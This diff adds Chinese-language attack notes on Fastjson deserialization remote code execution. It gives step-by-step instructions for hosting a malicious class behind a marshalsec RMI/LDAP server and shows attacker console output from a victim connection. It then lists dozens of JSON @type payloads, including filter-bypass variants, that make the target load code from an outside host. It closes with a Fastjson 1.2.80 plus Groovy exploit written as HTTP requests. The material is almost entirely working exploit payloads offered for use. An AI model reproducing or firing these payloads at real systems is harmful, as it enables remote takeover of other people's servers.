@@ -1,0 +1,106 @@
+Fastjson漏洞可以命令执行
+
+攻击流程：
+1.找一台装有java的机器，运行	javac ExportObject.java会得到ExportObject.class
+2.将ExportObject.class放到外网http服务器上，比如。http://你的服务器ip/ExportObject.class
+3.在外网服务器上运行java -cp marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://你的服务器ip/#ExportObject 10086 表示该http下的class转换成rmi服务
+4.在目标站点运行 
+
+攻击方：
+root@test:~/tools/rmi# java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://183.2.xxx.xxx/#Exploit 10086
+
+* Opening JRMP listener on 10086
+
+Have connection from /121.xxx.xxx.xxx:55837
+
+Reading message...
+
+Is RMI.lookup call for Exploit 2
+
+Sending remote classloading stub targeting http://183.2.xxx.xxx/Exploit.class
+
+Closing connection
+
+
+
+1. 老的
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://恶意主机:端口/Object","autoCommit":true}
+{\"@type\":\"LL\u0063\u006f\u006d.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://xxx.24.xxx.xxx:80/Object\",\"autoCommit\":true}
+
+{"name":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://183.2.xxx.xxx:10086/Exploit","autoCommit":true},age:12}
+
+2. 包括1.2.45的
+
+{"name":{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://xxx.2.xxx.xxx:10086/Exploit"},"autoCommit":true},age:12}
+
+FUZZ:
+
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://fast.bugseek.dnslog.cn/Object","autoCommit":true}
+{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://fast.bugseek.dnslog.cn/Object","autoCommit":true}}
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://fast.bugseek.dnslog.cn/jndi", "autoCommit":true}
+{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://fast.bugseek.dnslog.cn/jndi", "autoCommit":true}
+{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://fast.bugseek.dnslog.cn/Exploit", "autoCommit":true}
+{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"ldap://fast.bugseek.dnslog.cn/Exploit", "autoCommit":true}
+{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://fast.bugseek.dnslog.cn/Exploit"}}
+{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://fast.bugseek.dnslog.cn/Exploit","autoCommit":true}}
+{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://fast.bugseek.dnslog.cn/exploit"}"
+{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://fast.bugseek.dnslog.cn/Calc"}
+{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://fast.bugseek.dnslog.cn/Calc"}
+{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://fast.bugseek.dnslog.cn/Calc"}
+{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://fast.bugseek.dnslog.cn/Exploit", "autoCommit":true}}
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://fast.bugseek.dnslog.cn/Exploit","autoCommit":true}
+{"@type":"Lcom.sun.rowset.RowSetImpl;","dataSourceName":"rmi://fast.bugseek.dnslog.cn/Exploit","autoCommit":true}
+{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"rmi://fast.bugseek.dnslog.cn/Exploit","autoCommit":true};
+{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"rmi://fast.bugseek.dnslog.cn/Exploit","autoCommit":true]}
+{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://fast.bugseek.dnslog.cn/Exploit"}}
+{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://fast.bugseek.dnslog.cn/Exploit","autoCommit":true}}}
+{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"rmi://fast.bugseek.dnslog.cn/Calc"}
+{"@type":"com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"rmi://fast.bugseek.dnslog.cn/Calc"}
+{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://fast.bugseek.dnslog.cn/Calc"}
+{"@type":"com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://fast.bugseek.dnslog.cn/Calc"}
+{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"rmi://fast.bugseek.dnslog.cn/Calc"}
+{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"ldap://fast.bugseek.dnslog.cn/Calc","Object":"a"}
+{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry":"ldap://fast.bugseek.dnslog.cn/Calc"}
+{"@type":"org.apache.cocoon.components.slide.impl.JMSContentInterceptor", "parameters": {"@type":"java.util.Hashtable","java.naming.factory.initial":"com.sun.jndi.rmi.registry.RegistryContextFactory","topic-factory":"ldap://fast.bugseek.dnslog.cn/Calc"}, "namespace":""}
+{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://fast.bugseek.dnslog.cn/Calc"}}
+{%0d%0a "@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig",%0d%0a "properties":{%0d%0a "@type":"java.util.Properties",%0d%0a "UserTransaction":"rmi://cbfotf38nc6lpa800010ocfhjaiz88obp.oast.live/Exploit"%0d%0a }%0d%0a}
+{"@type":"org.apache.xbean.propertyeditor.JndiConverter","asText":"ldap://fast.bugseek.dnslog.cn/Calc"}
+{"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", "jndiNames":["ldap://fast.bugseek.dnslog.cn/Calc"], "Realms":[""]}
+{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://fast.bugseek.dnslog.cn/Calc"}
+{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://fast.bugseek.dnslog.cn/Calc"}
+
+1.2.80 + groovy 实现RCE
+1、第一步：准备Calc.class
+
+IDEA打开https://github.com/Lonely-night/fastjsonVul/attack模块，Maven导入项目，然后创建Calc.java，自定义命令后Mvn编译。
+mvn clean package -DskipTests=true -X
+
+2、EXP如下
+POST /drpxxxonal/xxxx HTTP/1.1
+Host: xxxx-xxx
+Content-Type: application/json
+Content-Length: 418
+
+
+{
+"\x40type":"java.lang.Exception",
+"\x40type":"org.codehaus.groovy.control.CompilationFailedException",
+"unit":{}
+}
+
+
+POST /xxx/xxxxyCode HTTP/1.1
+Host: x-xxx.xxx.com
+Content-Type: application/json
+Content-Length: 524
+
+
+{
+"\x40type":"org.codehaus.groovy.control.ProcessingUnit",
+"\x40type":"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit",
+"config":{
+"\x40type":"org.codehaus.groovy.control.CompilerConfiguration",
+"classpathList":"http://xxxxxxxx:8088/"
+}
+}
+3、使用python脚本运行http端口8088 即可打
